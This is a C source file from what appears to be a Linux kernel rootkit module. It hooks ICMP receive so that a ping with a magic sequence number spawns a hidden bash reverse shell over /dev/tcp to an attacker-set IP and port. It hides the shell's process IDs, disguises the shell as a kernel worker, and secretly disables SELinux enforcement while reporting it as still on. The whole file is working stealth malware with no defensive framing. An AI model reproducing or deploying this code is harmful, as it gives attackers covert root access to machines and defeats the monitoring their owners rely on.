#include "../include/core.h"
#include "../include/icmp.h"
#include "../include/hidden_pids.h"
#include "../ftrace/ftrace_helper.h"

#define SRV_PORT "8081"
#define ICMP_MAGIC_SEQ 1337
#define PROC_NAME "[kworker/0:1]"

static asmlinkage int (*orig_icmp_rcv)(struct sk_buff *);
static asmlinkage ssize_t (*orig_sel_read_enforce)(struct file *, char __user *, size_t, loff_t *);
static asmlinkage ssize_t (*orig_sel_write_enforce)(struct file *, const char __user *, size_t, loff_t *);

struct revshell_work {
    struct work_struct work;
};

static void *selinux_state_ptr = NULL;
static bool enforce_hook_active = false;
static int fake_enforce_value = 1;

notrace static asmlinkage ssize_t hook_sel_write_enforce(
    struct file *filp,
    const char __user *buf,
    size_t count,
    loff_t *ppos)
{
    char kbuf[32];
    long val;
    int ret;
    
    if (!enforce_hook_active)
        return orig_sel_write_enforce(filp, buf, count, ppos);
    
    if (count > 0 && count < sizeof(kbuf)) {
        if (copy_from_user(kbuf, buf, count))
            return -EFAULT;
        
        kbuf[count] = '\0';
        
        ret = kstrtol(kbuf, 10, &val);
        if (ret == 0) {
            fake_enforce_value = (int)val;
        }
    }
    
    *ppos += count;
    return count;
}

notrace static asmlinkage ssize_t hook_sel_read_enforce(
    struct file *filp,
    char __user *buf, 
    size_t count,
    loff_t *ppos)
{
    char tmpbuf[12];
    ssize_t length;
    
    if (enforce_hook_active) {
        length = scnprintf(tmpbuf, sizeof(tmpbuf), "%d",
                          fake_enforce_value);
        
        return simple_read_from_buffer(buf, count, ppos, tmpbuf, length);
    }
    
    return orig_sel_read_enforce(filp, buf, count, ppos);
}

notrace static int bypass_selinux_disable(void)
{
    struct {
        bool enforcing;
        bool checkreqprot;
        bool initialized;
    } *state;
    
    if (!selinux_state_ptr)
        return -1;
    
    state = selinux_state_ptr;
    
    #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
    state->enforcing = 0;
    enforce_hook_active = true;
    fake_enforce_value = 1;
    #endif
    
    return 0;
}

notrace static void spawn_revshell(struct work_struct *work)
{
    char cmd[768];
    static char *envp[] = {
        "HOME=/",
        "TERM=xterm-256color", 
        "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
        NULL
    };
    char *argv[] = {"/bin/bash", "-c", cmd, NULL};
    struct subprocess_info *sub_info;
    
    extern void enable_umh_bypass(void);
    extern void disable_umh_bypass(void);
    
    enable_umh_bypass();
    
    add_hidden_pid(current->pid);
    add_hidden_pid(current->tgid);
    
    bypass_selinux_disable();
    
    msleep(50);
    
    snprintf(cmd, sizeof(cmd),
             "bash -c '"
             "PID=$$; "
             "kill -59 $PID 2>/dev/null; "
             "exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1"
             "' 2>/dev/null &",
             PROC_NAME, YOUR_SRV_IP, SRV_PORT);
    
    sub_info = call_usermodehelper_setup(argv[0], argv, envp,
                                        GFP_KERNEL, NULL, NULL, NULL);
    if (sub_info)
        call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    
    disable_umh_bypass();
    
    kfree(container_of(work, struct revshell_work, work));
}

notrace static asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
{
    struct iphdr *iph;
    struct icmphdr *icmph;
    u32 trigger_ip;
    struct revshell_work *rw;
    
    if (!skb)
        goto out;
        
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP)
        goto out;
        
    icmph = icmp_hdr(skb);
    if (!icmph)
        goto out;
        
    if (!in4_pton(YOUR_SRV_IP, -1, (u8 *)&trigger_ip, -1, NULL))
        goto out;
        
    if (iph->saddr == trigger_ip && 
        icmph->type == ICMP_ECHO &&
        ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ) {
        
        rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
        if (rw) {
            INIT_WORK(&rw->work, spawn_revshell);
            schedule_work(&rw->work);
        }
    }
    
out:
    return orig_icmp_rcv(skb);
}

static struct ftrace_hook hooks[] = {
    HOOK("icmp_rcv", hook_icmp_rcv, &orig_icmp_rcv),
    HOOK("sel_read_enforce", hook_sel_read_enforce, &orig_sel_read_enforce),
    HOOK("sel_write_enforce", hook_sel_write_enforce, &orig_sel_write_enforce),
};

notrace int hiding_icmp_init(void)
{
    unsigned long addr;
    
    addr = (unsigned long)resolve_sym("selinux_state");
    if (addr)
        selinux_state_ptr = (void *)addr;
    
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hiding_icmp_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    enforce_hook_active = false;
    fake_enforce_value = 1;
    msleep(2000);
}
